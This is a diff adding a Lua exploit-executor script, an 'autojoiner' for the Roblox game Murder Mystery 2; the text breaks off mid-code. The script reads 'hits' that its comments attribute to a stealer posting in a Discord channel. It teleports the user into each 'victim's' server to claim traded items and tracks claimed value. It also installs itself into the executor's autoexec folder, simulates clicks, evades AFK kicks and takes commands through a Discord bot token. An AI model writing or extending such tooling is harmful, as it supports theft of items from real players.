@@ -1,0 +1,1960 @@
+-- ╔═══════════════════════════════════════════════════════════════════════╗
+-- ║  MM2 AUTOJOINER  —  WebSocket Gateway edition                        ║
+-- ╚═══════════════════════════════════════════════════════════════════════╝
+--
+-- CONFIG
+if not bottoken   then bottoken   = "" end
+if not webhookurl then webhookurl = "" end
+if not chanelid   then chanelid   = "" end
+-- HEADLESS mode: set to true for 24/7 AFK — skips WindUI entirely (saves ~15MB RAM + 2s update loop)
+if not AJ_HEADLESS then AJ_HEADLESS = true end
+-- NO-RENDER mode: black overlay + stats. ON by default. Toggle with !norender
+if getgenv()._aj_norender == nil then getgenv()._aj_norender = true end
+if not logid      then logid      = "" end  -- defaults to webhookurl if empty
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- EXECUTOR SHIMS
+-- ═══════════════════════════════════════════════════════════════════════
+if not getgenv then local _e = {}; getgenv = function() return _e end end
+if not task then task = { spawn = spawn, wait = wait, delay = delay }
+elseif not task.spawn then task.spawn = spawn end
+if not request then
+    request = (syn and syn.request) or (http and http.request)
+          or (fluxus and fluxus.request) or (krnl and krnl.request)
+          or function() return { StatusCode = 0, Body = "" } end
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- GENERATION GUARD  (kills old tasks when script is re-executed)
+-- ═══════════════════════════════════════════════════════════════════════
+getgenv()._aj_gen = (getgenv()._aj_gen or 0) + 1
+local MY_GEN = getgenv()._aj_gen
+local function alive() return MY_GEN == getgenv()._aj_gen end
+
+-- Self-install to autoexec so the script runs automatically on every game join
+-- (including after teleports) with no queue_on_teleport dependency.
+-- FIRST-TIME SETUP: copy mm2_autojoiner.lua into your executor root
+-- (C:\Users\User\Desktop\OpXOyuApWKTlFzrV\) once, run this script once.
+-- After that it installs itself to autoexec permanently.
+if not getgenv()._aj_src or getgenv()._aj_src == "" then
+    pcall(function()
+        local s = getscriptsource and getscriptsource()
+        if type(s) == "string" and s ~= "" then getgenv()._aj_src = s end
+    end)
+end
+if not getgenv()._aj_src or getgenv()._aj_src == "" then
+    for _, p in ipairs({ "mm2_autojoiner.lua", "autoexec/mm2_autojoiner.lua", "workspace/mm2_autojoiner.lua", "scripts/mm2_autojoiner.lua" }) do
+        local ok, s = pcall(readfile, p)
+        if ok and type(s) == "string" and s ~= "" then getgenv()._aj_src = s; break end
+    end
+end
+if getgenv()._aj_src and getgenv()._aj_src ~= "" then
+    pcall(writefile, "autoexec/mm2_autojoiner.lua", getgenv()._aj_src)
+    pcall(writefile, "mm2_autojoiner.lua", getgenv()._aj_src)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- SERVICES
+-- ═══════════════════════════════════════════════════════════════════════
+local Players         = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService     = game:GetService("HttpService")
+local VirtualUser     = game:GetService("VirtualUser")
+-- LocalPlayer may not exist yet if the script runs before the player loads
+local LP = Players.LocalPlayer
+if not LP then
+    repeat task.wait(0.05) until Players.LocalPlayer
+    LP = Players.LocalPlayer
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- DEVICE SELECT / PLAY PROMPT
+-- Handles two separate MM2 load screens:
+--   1. DeviceSelect  — Tablet/Phone chooser (mobile)
+--   2. Loading > Join > Friends > Play  — friend-server join prompt (PC + mobile)
+-- ═══════════════════════════════════════════════════════════════════════
+task.spawn(function()
+    local UIS = game:GetService("UserInputService")
+    local isMobile = UIS.TouchEnabled
+    local GAME_GUIS = {
+        TradeGUI=true, TradeGUI_Phone=true, Scoreboard=true, Scoreboard_Phone=true,
+        CrossPlatform=true, GameTopbar=true, InputContext=true, Fade=true, MainGUI=true,
+        GameplayControlsUI=true, BackpackUI=true, SpawnFade=true, CameraFade=true,
+        TouchInteractButtons=true, DeviceSelect=true, InteractGUI=true, Loading=true, Join=true,
+    }
+    local VIM = game:GetService("VirtualInputManager")
+
+    local function vimClick(btn)
+        local t = 0
+        while btn.AbsoluteSize.X == 0 and t < 3 do task.wait(0.05); t = t + 0.05 end
+        if btn.AbsoluteSize.X == 0 then return false end
+        pcall(function() btn:Activate() end)
+        local pos, sz = btn.AbsolutePosition, btn.AbsoluteSize
+        VIM:SendMouseButtonEvent(pos.X + sz.X/2, pos.Y + sz.Y/2, 0, true,  game, 1)
+        task.wait(0.05)
+        VIM:SendMouseButtonEvent(pos.X + sz.X/2, pos.Y + sz.Y/2, 0, false, game, 1)
+        return true
+    end
+
+    local function hideInjectedGuis()
+        local hidden = {}
+        if isMobile then
+            pcall(function()
+                for _, gui in ipairs(LP.PlayerGui:GetChildren()) do
+                    if gui:IsA("ScreenGui") and gui.Enabled and not GAME_GUIS[gui.Name] then
+                        gui.Enabled = false; table.insert(hidden, gui)
+                    end
+                end
+            end)
+            task.wait(0.1)
+        end
+        return hidden
+    end
+
+    local function restoreGuis(hidden)
+        if #hidden > 0 then
+            task.wait(0.4)
+            for _, gui in ipairs(hidden) do pcall(function() gui.Enabled = true end) end
+        end
+    end
+
+    getgenv()._aj_vimDone = false
+    local dsHandled = not isMobile   -- PC never needs DeviceSelect; mark done immediately
+    local loadHandled = false
+    local _startTime = tick()
+    while task.wait(0.1) do
+        local pg = LP.PlayerGui
+        if dsHandled and loadHandled then break end
+        local joinGui     = pg:FindFirstChild("Join")
+        local joinFriends = joinGui and joinGui:FindFirstChild("Friends")
+        local joinActive  = joinFriends and joinFriends.Visible == true
+        if not pg:FindFirstChild("DeviceSelect") and not joinActive and tick() - _startTime > 5 then break end
+        if tick() - _startTime > 15 then break end
+
+        -- 1. DeviceSelect — Tablet/Phone chooser (mobile)
+        if not dsHandled and pg:FindFirstChild("DeviceSelect") then
+            local ds = pg:FindFirstChild("DeviceSelect")
+            local Container = ds:WaitForChild("Container", 5)
+            local btn
+            local tabletCard = Container and Container:FindFirstChild("Tablet")
+            btn = tabletCard and tabletCard:FindFirstChild("Button")
+            if not btn then
+                local phoneCard = Container and Container:FindFirstChild("Phone")
+                btn = phoneCard and phoneCard:FindFirstChild("Button")
+            end
+            if btn then
+                local hidden = hideInjectedGuis()
+                for _, sigName in ipairs({"Activated", "MouseButton1Click", "MouseButton1Down"}) do
+                    pcall(function()
+                        for _, conn in ipairs(getconnections(btn[sigName])) do
+                            pcall(conn.Function)
+                        end
+                    end)
+                end
+                pcall(function() btn:Activate() end)
+                restoreGuis(hidden)
+                dsHandled = true
+            end
+        end
+
+        -- 2. Join > Friends > Play — "Joining a friend?" prompt (PC + mobile)
+        if not loadHandled and joinActive then
+            local btn = joinFriends:FindFirstChild("Play")
+            if btn then
+                local hidden = hideInjectedGuis()
+                local clicked = vimClick(btn)
+                restoreGuis(hidden)
+                if clicked then loadHandled = true end
+            end
+        end
+    end
+    getgenv()._aj_vimDone = true
+end)
+
+-- Persistent watcher: clicks the "Joining a friend?" Play button whenever it
+-- appears, regardless of when the dialog shows relative to the device-select block.
+task.spawn(function()
+    local GAME_GUIs_PW = {
+        TradeGUI=true, TradeGUI_Phone=true, Scoreboard=true, Scoreboard_Phone=true,
+        CrossPlatform=true, GameTopbar=true, InputContext=true, Fade=true, MainGUI=true,
+        GameplayControlsUI=true, BackpackUI=true, SpawnFade=true, CameraFade=true,
+        TouchInteractButtons=true, DeviceSelect=true, InteractGUI=true, Loading=true, Join=true,
+    }
+    local _VIM = game:GetService("VirtualInputManager")
+    local function fireBtn(btn)
+        for _, sigName in ipairs({"Activated", "MouseButton1Click", "MouseButton1Down"}) do
+            pcall(function()
+                for _, conn in ipairs(getconnections(btn[sigName])) do
+                    pcall(conn.Function)
+                end
+            end)
+        end
+        task.wait(0.05)
+        pcall(function() firesignal(btn.MouseButton1Down) end)
+        task.wait(0.05)
+        pcall(function() firesignal(btn.MouseButton1Up) end)
+        task.wait(0.05)
+        pcall(function() firesignal(btn.MouseButton1Click) end)
+        task.wait(0.05)
+        pcall(function() firesignal(btn.Activated) end)
+        task.wait(0.05)
+        pcall(function() btn:Activate() end)
+        task.wait(0.05)
+        local pos, sz = btn.AbsolutePosition, btn.AbsoluteSize
+        _VIM:SendMouseButtonEvent(pos.X + sz.X/2, pos.Y + sz.Y/2, 0, true,  game, 1)
+        task.wait(0.05)
+        _VIM:SendMouseButtonEvent(pos.X + sz.X/2, pos.Y + sz.Y/2, 0, false, game, 1)
+        task.wait(0.05)
+        pcall(function()
+            _VIM:SendKeyEvent(true,  Enum.KeyCode.Return, false, game)
+            task.wait(0.05)
+            _VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+        end)
+    end
+    local _pwStart = tick()
+    while alive() and tick() - _pwStart < 30 do
+        task.wait(0.2)
+        pcall(function()
+            local pg = LP.PlayerGui
+            local joinGui = pg:FindFirstChild("Join")
+            if not joinGui then return end
+            local friends = joinGui:FindFirstChild("Friends")
+            if not (friends and friends.Visible) then return end
+            local play = friends:FindFirstChild("Play")
+            if not play then return end
+            local t = 0
+            while play.AbsoluteSize.X == 0 and t < 2 do task.wait(0.05); t = t + 0.05 end
+            if play.AbsoluteSize.X == 0 then return end
+            local hidden = {}
+            for _, gui in ipairs(pg:GetChildren()) do
+                if gui:IsA("ScreenGui") and gui.Enabled and not GAME_GUIs_PW[gui.Name] then
+                    pcall(function() gui.Enabled = false end)
+                    table.insert(hidden, gui)
+                end
+            end
+            if #hidden > 0 then task.wait(0.1) end
+            fireBtn(play)
+            if #hidden > 0 then
+                task.wait(0.4)
+                for _, gui in ipairs(hidden) do pcall(function() gui.Enabled = true end) end
+            end
+            task.wait(2)
+        end)
+    end
+end)
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- PERSISTENT STATE  (survives server hops via getgenv)
+-- ═══════════════════════════════════════════════════════════════════════
+getgenv()._aj_done          = getgenv()._aj_done or false
+getgenv()._aj_doneReason    = getgenv()._aj_doneReason or ""
+getgenv()._aj_sessionVal    = getgenv()._aj_sessionVal or 0
+getgenv()._aj_sessionHits   = getgenv()._aj_sessionHits or 0
+getgenv()._aj_sessionStart  = getgenv()._aj_sessionStart or os.time()
+getgenv()._aj_visited       = getgenv()._aj_visited or {}
+getgenv()._aj_hitQueue      = getgenv()._aj_hitQueue or {}
+getgenv()._aj_currentHit    = getgenv()._aj_currentHit or nil
+getgenv()._aj_inServerSince = getgenv()._aj_inServerSince or 0
+getgenv()._aj_claimedTotal  = getgenv()._aj_claimedTotal or 0
+getgenv()._aj_lastTradeTime = getgenv()._aj_lastTradeTime or 0  -- last victim trade activity timestamp
+getgenv()._aj_knownPlayers  = getgenv()._aj_knownPlayers  or {}  -- player names seen in webhook channel
+getgenv()._aj_lastFailedHit = getgenv()._aj_lastFailedHit or nil
+getgenv()._aj_lastClaimTime = getgenv()._aj_lastClaimTime or 0
+getgenv()._aj_lastClaimInfo = getgenv()._aj_lastClaimInfo or nil
+getgenv()._aj_lastAction    = getgenv()._aj_lastAction    or nil  -- {msg, ts} last notable event
+getgenv()._aj_sessionClaims = getgenv()._aj_sessionClaims or 0   -- total claims this session
+getgenv()._aj_lastWeapon    = getgenv()._aj_lastWeapon    or nil  -- {name, amount, value, ts}
+getgenv()._aj_teleporting   = getgenv()._aj_teleporting   or false
+-- WebSocket gateway session (persists across teleports for RESUME)
+getgenv()._aj_gwSeq       = getgenv()._aj_gwSeq       or nil
+getgenv()._aj_gwSession   = getgenv()._aj_gwSession   or nil
+getgenv()._aj_gwResumeUrl = getgenv()._aj_gwResumeUrl or nil
+getgenv()._aj_gwResume    = getgenv()._aj_gwResume    or false
+
+local visited  = getgenv()._aj_visited
+local hitQueue = getgenv()._aj_hitQueue
+
+local function setAction(msg)
+    getgenv()._aj_lastAction = { msg = msg, ts = os.time() }
+end
+
+-- Mark the current server as visited immediately so the join loop never
+-- tries to teleport us to a server we're already in (getgenv resets on
+-- every game load, so visited is empty on each autoexec re-run).
+local _curJobId = tostring(game.JobId)
+if _curJobId ~= "" then visited[_curJobId] = true end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- HELPERS
+-- ═══════════════════════════════════════════════════════════════════════
+local function commaNum(n)
+    local s = tostring(math.floor(n or 0))
+    return (s:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", ""))
+end
+local function elapsedStr(t)
+    local s = os.time() - (t or os.time())
+    return string.format("%dm %ds", math.floor(s/60), s%60)
+end
+local function snowflakeTs(id)
+    local n = tonumber(tostring(id))
+    if not n then return 0 end
+    return math.floor(n / 4194304) / 1000 + 1420070400
+end
+local function nrm(s) return (s or ""):lower():gsub("[%s%'%-]", "") end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- BASELINE PERSISTENCE
+-- Tracks the newest Discord message ID we've already seen.
+-- Stored in a file so it survives teleports and autoexec re-runs — this is
+-- what prevents old/stale embeds from being re-queued on every restart.
+-- ═══════════════════════════════════════════════════════════════════════
+local BASELINE_FILE = "aj_baseline.txt"
+local function loadBaseline()
+    local ok, v = pcall(readfile, BASELINE_FILE)
+    if ok and type(v) == "string" and #v > 0 then return v end
+    return nil
+end
+local function saveBaseline(id)
+    pcall(writefile, BASELINE_FILE, tostring(id))
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- MESSAGE-ID DEDUP  (file-backed so duplicates survive restarts)
+-- Prevents the same Discord message from being processed twice on
+-- gateway reconnect, REST fallback or autoexec re-run.
+-- ═══════════════════════════════════════════════════════════════════════
+local JNUBS_FILE = "aj_jnubs.txt"
+local _seenMsgIds = {}   -- in-memory; initialised from file at startup
+
+pcall(function()
+    local v = readfile(JNUBS_FILE)
+    local t = HttpService:JSONDecode(v)
+    if type(t) == "table" then
+        for _, id in ipairs(t) do _seenMsgIds[id] = true end
+    end
+end)
+
+local function isSeen(msgId)    return _seenMsgIds[tostring(msgId)] == true end
+local function markSeen(msgId)
+    msgId = tostring(msgId)
+    if _seenMsgIds[msgId] then return end
+    _seenMsgIds[msgId] = true
+    task.spawn(function()
+        local t = {}
+        for id in pairs(_seenMsgIds) do table.insert(t, id) end
+        table.sort(t)
+        while #t > 500 do table.remove(t, 1) end   -- cap to 500 IDs
+        pcall(writefile, JNUBS_FILE, HttpService:JSONEncode(t))
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- DISCORD REACTION  (✅ on every message we act on)
+-- ═══════════════════════════════════════════════════════════════════════
+local function reactOk(msgId)
+    if not chanelid or chanelid == "" then return end
+    pcall(function()
+        request({
+            Url     = "https://discord.com/api/v10/channels/" .. chanelid
+                      .. "/messages/" .. tostring(msgId) .. "/reactions/%E2%9C%85/@me",
+            Method  = "PUT",
+            Headers = { ["Authorization"] = bottoken },
+        })
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- ANTI-AFK
+-- ═══════════════════════════════════════════════════════════════════════
+task.spawn(function()
+    pcall(function()
+        LP.Idled:Connect(function()
+            pcall(function() VirtualUser:CaptureController(); VirtualUser:ClickButton2(Vector2.new()) end)
+        end)
+    end)
+    while alive() do
+        pcall(function() VirtualUser:CaptureController(); VirtualUser:ClickButton2(Vector2.new()) end)
+        task.wait(55)
+    end
+end)
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- MESSAGE PARSER
+-- Handles: (A) embed URL fern.wtf/joiner?placeId=X&gameInstanceId=Y
+--          (B) content TeleportToPlaceInstance(X, "Y")
+-- ═══════════════════════════════════════════════════════════════════════
+local MAX_HIT_AGE = 20 * 60  -- skip hits older than 20 minutes
+
+local function isDeadEmbed(embed)
+    if not embed then return false end
+    if (embed.title or ""):lower():find("left after", 1, true) then return true end
+    for _, f in ipairs(embed.fields or {}) do
+        local fv = (f.value or ""):lower()
+        -- transferer status field: value = "# Status\n<emoji> <status>"
+        -- match "claimed" (but NOT "almost claimed") or "left"
+        if fv:find("# status") or fv:find("# ") then
+            if fv:find("%f[%a]claimed%f[%A]") or fv:find("%f[%a]left%f[%A]") then return true end
+            if fv:find("left after") then return true end
+        end
+        -- legacy format: field named "Status"
+        if (f.name or ""):lower() == "status" then
+            if fv:find("left server") or fv:find("%f[%a]claimed%f[%A]") then return true end
+        end
+    end
+    return false
+end
+
+local function parseHit(msg)
+    if tostring(msg.channel_id) ~= tostring(chanelid) then return nil end
+    local msgId = tostring(msg.id)
+    local placeId, jobId, value, playerName
+    local embed = msg.embeds and msg.embeds[1]
+    if embed then
+        if isDeadEmbed(embed) then return nil end
+        local vs = (embed.title or ""):match("([%d,]+) value")
+        if vs then local s = vs:gsub(",",""); value = tonumber(s) end
+        local url = embed.url or ""
+        placeId    = url:match("placeId=(%d+)")
+        jobId      = url:match("gameInstanceId=([^&%s]+)")
+        playerName = (embed.author and embed.author.name) or "Unknown"
+    end
+    if (not placeId or not jobId) and msg.content then
+        placeId, jobId = msg.content:match('TeleportToPlaceInstance%((%d+),%s*"([^"]+)"')
+    end
+    if not placeId or not jobId or jobId == "" then return nil end
+    if visited[jobId] then return nil end
+    local ts = snowflakeTs(msgId)
+    if os.time() - ts > MAX_HIT_AGE then return nil end  -- too old, skip
+    -- strip age suffix from author name: "Name  •  37d old" → "Name"
+    local rawName = playerName or "Unknown"
+    local cleanName = rawName:match("^(.-)%s+%•") or rawName
+    return {
+        msgId      = msgId,
+        jobId      = jobId,
+        placeId    = tonumber(placeId),
+        value      = value or 0,
+        playerName = cleanName,
+        rawName    = rawName,
+        timestamp  = ts,
+    }
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- QUEUE MANAGEMENT
+-- ═══════════════════════════════════════════════════════════════════════
+local function enqueue(hit)
+    for _, h in ipairs(hitQueue) do
+        if h.jobId == hit.jobId then return end
+    end
+    table.insert(hitQueue, hit)
+    table.sort(hitQueue, function(a, b) return a.value > b.value end)
+end
+
+local function dequeue()
+    for i, h in ipairs(hitQueue) do
+        if not visited[h.jobId] then
+            table.remove(hitQueue, i)
+            return h
+        end
+    end
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- EMBED PATCHER
+-- Fetches the stealer's Discord message and updates the Status field.
+-- Uses the webhook PATCH endpoint so no bot token scope is needed for write.
+-- ═══════════════════════════════════════════════════════════════════════
+local function patchHitStatus(hit, statusText)
+    if not hit or not hit.msgId or not chanelid or chanelid == "" then return end
+    if not webhookurl or webhookurl == "" then return end
+    -- Fetch the current message to get the full embed (we must resend the whole thing)
+    local fetchRes
+    pcall(function()
+        fetchRes = request({
+            Url     = "https://discord.com/api/v10/channels/" .. chanelid .. "/messages/" .. hit.msgId,
+            Method  = "GET",
+            Headers = { ["Authorization"] = bottoken, ["Content-Type"] = "application/json" },
+        })
+    end)
+    if not fetchRes or fetchRes.StatusCode ~= 200 or not fetchRes.Body then return end
+    local msg
+    pcall(function() msg = HttpService:JSONDecode(fetchRes.Body) end)
+    if not msg or not msg.embeds or not msg.embeds[1] then return end
+    local embed = msg.embeds[1]
+    for _, f in ipairs(embed.fields or {}) do
+        if f.name == "Status" then f.value = statusText; break end
+    end
+    pcall(function()
+        request({
+            Url     = webhookurl .. "/messages/" .. hit.msgId,
+            Method  = "PATCH",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body    = HttpService:JSONEncode({ embeds = { embed } }),
+        })
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- QUEUE-ON-TELEPORT  (best-effort — executor auto-rerun handles fallback)
+-- If this succeeds, getgenv state is preserved across the hop.
+-- If it fails, detectCurrentHit() recovers the target from Discord on restart.
+-- ═══════════════════════════════════════════════════════════════════════
+local function queueReexec()
+    local qot
+    for _, ns in ipairs({ _G, syn, fluxus, krnl, wave, electron, getgenv() }) do
+        if type(ns) == "table" and type(ns.queue_on_teleport) == "function" then
+            qot = ns.queue_on_teleport; break
+        end
+    end
+    if not qot then
+        local ok, v = pcall(function() return queue_on_teleport end)
+        if ok and type(v) == "function" then qot = v end
+    end
+    if not qot then return end
+
+    local src = getgenv()._aj_src or ""
+    if src ~= "" then
+        -- Best case: queue our full source
+        pcall(qot, src)
+    else
+        -- Source unavailable — call queue_on_teleport with a placeholder.
+        -- Many executors use the *call itself* as the signal to re-inject their
+        -- last manually-run script, so this is enough to trigger auto-rerun.
+        pcall(qot, "-- mm2_autojoiner requeue placeholder")
+    end
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- DETECT CURRENT HIT  (state recovery when getgenv resets after teleport)
+-- Matches game.JobId against recent Discord embeds to find our target.
+-- Called at startup before the seed scan so the victim doesn't get queued.
+-- ═══════════════════════════════════════════════════════════════════════
+local function detectCurrentHit()
+    if not chanelid or chanelid == "" then return nil end
+    local myJobId = tostring(game.JobId)
+    if myJobId == "" then return nil end
+
+    local res
+    pcall(function()
+        res = request({
+            Url     = "https://discord.com/api/v10/channels/" .. chanelid .. "/messages?limit=20",
+            Method  = "GET",
+            Headers = { ["Authorization"] = bottoken, ["Content-Type"] = "application/json" },
+        })
+    end)
+    if not res or res.StatusCode ~= 200 or not res.Body then return nil end
+
+    local msgs
+    pcall(function() msgs = HttpService:JSONDecode(res.Body) end)
+    if not msgs then return nil end
+
+    for _, m in ipairs(msgs) do
+        if tostring(m.channel_id) ~= tostring(chanelid) then continue end
+        local embed = m.embeds and m.embeds[1]
+        if not embed then continue end
+        if isDeadEmbed(embed) then continue end
+        local url    = embed.url or ""
+        local jobId  = url:match("gameInstanceId=([^&%s]+)")
+        if jobId ~= myJobId then continue end
+        -- Found the embed for THIS server
+        local vs = (embed.title or ""):match("([%d,]+) value")
+        local value = 0
+        if vs then local s = vs:gsub(",",""); value = tonumber(s) or 0 end
+        local rawName = (embed.author and embed.author.name) or "Unknown"
+        local cleanName = rawName:match("^(.-)%s+%•") or rawName
+        return {
+            msgId      = tostring(m.id),
+            jobId      = jobId,
+            placeId    = tonumber(url:match("placeId=(%d+)")),
+            value      = value,
+            playerName = cleanName,
+            rawName    = rawName,
+            timestamp  = snowflakeTs(m.id),
+        }
+    end
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- LIVE-CHECK  (re-fetches the embed right before joining to confirm the
+-- victim hasn't already left — guards against stale queue entries)
+-- ═══════════════════════════════════════════════════════════════════════
+local function isHitStillLive(hit)
+    if not hit.msgId or not chanelid or chanelid == "" then return true end
+    local res
+    pcall(function()
+        res = request({
+            Url     = "https://discord.com/api/v10/channels/" .. chanelid .. "/messages/" .. hit.msgId,
+            Method  = "GET",
+            Headers = { ["Authorization"] = bottoken, ["Content-Type"] = "application/json" },
+        })
+    end)
+    if not res or res.StatusCode ~= 200 or not res.Body then return true end
+    local msg
+    pcall(function() msg = HttpService:JSONDecode(res.Body) end)
+    if not msg then return true end
+    local embed = msg.embeds and msg.embeds[1]
+    if not embed then return true end
+    if (embed.title or ""):lower():find("left after", 1, true) then return false end
+    for _, f in ipairs(embed.fields or {}) do
+        if f.name == "Status" and f.value:lower():find("left server", 1, true) then return false end
+    end
+    return true
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- TELEPORT
+-- ═══════════════════════════════════════════════════════════════════════
+local function joinServer(hit)
+    -- Hard guard: never teleport to the server we're already in
+    if tostring(game.JobId) == hit.jobId then
+        warn("[AJ] Already in " .. hit.playerName .. "'s server — skipping joinServer")
+        visited[hit.jobId] = true
+        return
+    end
+    getgenv()._aj_currentHit    = hit
+    getgenv()._aj_inServerSince = os.time()
+    getgenv()._aj_lastTradeTime = os.time()  -- 60s clock starts from join
+    getgenv()._aj_done          = false
+    getgenv()._aj_doneReason    = ""
+    visited[hit.jobId] = true
+    getgenv()._aj_sessionHits = (getgenv()._aj_sessionHits or 0) + 1
+    -- Update embed to show autojoiner is on the way
+    task.spawn(function() patchHitStatus(hit, "🟡 Autojoining...") end)
+
+    -- Queue the script to re-execute in the new server after teleport.
+    queueReexec()
+
+    if logid and logid ~= "" then
+        pcall(function()
+            request({
+                Url     = logid,
+                Method  = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body    = HttpService:JSONEncode({
+                    content = "Joining **" .. hit.playerName .. "** · " .. commaNum(hit.value) .. " value"
+                })
+            })
+        end)
+    end
+
+    getgenv()._aj_teleporting = true
+
+    -- TeleportInitFailed: retry up to 5 times before giving up
+    local _failConn
+    local _failCount = 0
+    local _failHit   = hit
+    _failConn = TeleportService.TeleportInitFailed:Connect(function(player, reason)
+        if player ~= LP then return end
+        _failCount = _failCount + 1
+        warn("[AJ] TeleportInitFailed: " .. tostring(reason) .. " (attempt " .. _failCount .. ")")
+        if _failCount > 5 then
+            warn("[AJ] Giving up after 5 failed teleport attempts")
+            pcall(function() _failConn:Disconnect() end)
+            getgenv()._aj_teleporting = false
+            getgenv()._aj_currentHit  = nil
+            return
+        end
+        -- Only retry if we're still targeting the same hit
+        local ch = getgenv()._aj_currentHit
+        if ch and ch.jobId == _failHit.jobId then
+            task.delay(2, function()
+                if getgenv()._aj_currentHit and getgenv()._aj_currentHit.jobId == _failHit.jobId then
+                    pcall(function() TeleportService:TeleportToPlaceInstance(_failHit.placeId, _failHit.jobId, LP) end)
+                end
+            end)
+        else
+            pcall(function() _failConn:Disconnect() end)
+        end
+    end)
+
+    pcall(function()
+        TeleportService:TeleportToPlaceInstance(hit.placeId, hit.jobId, LP)
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- LOG SYSTEM  (feeds both warn() and the Console tab in WindUI)
+-- ═══════════════════════════════════════════════════════════════════════
+local logSlots   = {}
+local logEntries = {}
+local LOG_MAX    = 12
+local function logMsg(msg)
+    local line = os.date("%H:%M:%S") .. "  " .. msg
+    table.insert(logEntries, 1, line)
+    if #logEntries > LOG_MAX then table.remove(logEntries) end
+    warn("[AJ] " .. msg)
+    for i, slot in ipairs(logSlots) do
+        local entry = logEntries[i]
+        pcall(function()
+            if entry then slot:SetTitle(entry); slot:SetDesc("")
+            else slot:SetTitle("—"); slot:SetDesc("") end
+        end)
+    end
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- SERVER HOP  (self-contained — no external URL dependency)
+-- ═══════════════════════════════════════════════════════════════════════
+local function doServerHop()
+    local placeId     = game.PlaceId
+    local curJob      = tostring(game.JobId)
+    local maxSlots    = Players.MaxPlayers
+    local cursor      = ""
+    local tried       = 0
+    local best, bestPlaying = nil, math.huge
+    for _ = 1, 3 do
+        local url = "https://games.roblox.com/v1/games/" .. placeId ..
+            "/servers/Public?sortOrder=Asc&limit=100" .. (cursor ~= "" and ("&cursor=" .. cursor) or "")
+        local ok, res = pcall(request, { Url = url, Method = "GET" })
+        if not ok or not res or res.StatusCode ~= 200 then break end
+        local data
+        pcall(function() data = HttpService:JSONDecode(res.Body) end)
+        if not data or not data.data then break end
+        tried = tried + #data.data
+        for _, srv in ipairs(data.data) do
+            if tostring(srv.id) ~= curJob and (srv.playing or 0) < maxSlots and (srv.playing or 0) < bestPlaying then
+                best, bestPlaying = srv, srv.playing or 0
+            end
+        end
+        cursor = data.nextPageCursor or ""
+        if cursor == "" then break end
+    end
+    if best then
+        logMsg("ServerHop: joining server " .. bestPlaying .. "/" .. maxSlots .. " (checked " .. tried .. ")")
+        pcall(function() TeleportService:TeleportToPlaceInstance(placeId, best.id, LP) end)
+        return
+    end
+    logMsg("ServerHop: no open server found (" .. tried .. " checked) — matchmaker fallback")
+    pcall(function() TeleportService:Teleport(placeId, LP) end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- BOT COMMANDS  (!status  !inv  !rejoin  !serverhop  !retry)
+-- ═══════════════════════════════════════════════════════════════════════
+local function sendBotMsg(content)
+    if not chanelid or chanelid == "" then return end
+    pcall(function()
+        request({
+            Url     = "https://discord.com/api/v10/channels/" .. chanelid .. "/messages",
+            Method  = "POST",
+            Headers = { ["Authorization"] = bottoken, ["Content-Type"] = "application/json" },
+            Body    = HttpService:JSONEncode({ content = content }),
+        })
+    end)
+end
+
+local function sendBotEmbed(embed)
+    if not chanelid or chanelid == "" then return end
+    pcall(function()
+        request({
+            Url     = "https://discord.com/api/v10/channels/" .. chanelid .. "/messages",
+            Method  = "POST",
+            Headers = { ["Authorization"] = bottoken, ["Content-Type"] = "application/json" },
+            Body    = HttpService:JSONEncode({ embeds = { embed } }),
+        })
+    end)
+end
+
+local destroyNoRender, buildNoRender  -- forward-declared; defined after WindUI section
+
+local function handleCommand(cmd, senderName)
+    logMsg("CMD !" .. cmd .. " from " .. senderName)
+    if cmd == "status" then
+        local ch     = getgenv()._aj_currentHit
+        local qLen   = #hitQueue
+        local action = getgenv()._aj_lastAction
+        local weapon = getgenv()._aj_lastWeapon
+        local claims = getgenv()._aj_sessionClaims or 0
+        local sessVal= getgenv()._aj_sessionVal or 0
+
+        local function agoStr(ts)
+            if not ts or ts == 0 then return "—" end
+            local d = os.time() - ts
+            if d < 60 then return d .. "s ago"
+            elseif d < 3600 then return math.floor(d/60) .. "m " .. (d%60) .. "s ago"
+            else return math.floor(d/3600) .. "h " .. math.floor(d/60)%60 .. "m ago" end
+        end
+
+        if ch then
+            local elapsed = os.time() - (getgenv()._aj_inServerSince or os.time())
+            local m, s   = math.floor(elapsed / 60), elapsed % 60
+            local timeStr = m .. "m " .. s .. "s"
+
+            local lastWeaponLine = "—"
+            if weapon then
+                lastWeaponLine = weapon.name .. " x" .. weapon.amount
+                    .. " (" .. commaNum(weapon.value) .. " val) · " .. agoStr(weapon.ts)
+            end
+
+            sendBotEmbed({
+                color  = 0x2ECC71,
+                title  = "🟢 Active — " .. ch.playerName,
+                fields = {
+                    { name = "💰 Hit Value",     value = commaNum(ch.value), inline = true },
+                    { name = "⏱️ Time in Server", value = timeStr,           inline = true },
+                    { name = "📋 Queue",          value = tostring(qLen),     inline = true },
+                    { name = "🏆 Session Claims", value = claims .. " trades · +" .. commaNum(sessVal) .. " val", inline = false },
+                    { name = "🗡️ Last Weapon",    value = lastWeaponLine,                                         inline = false },
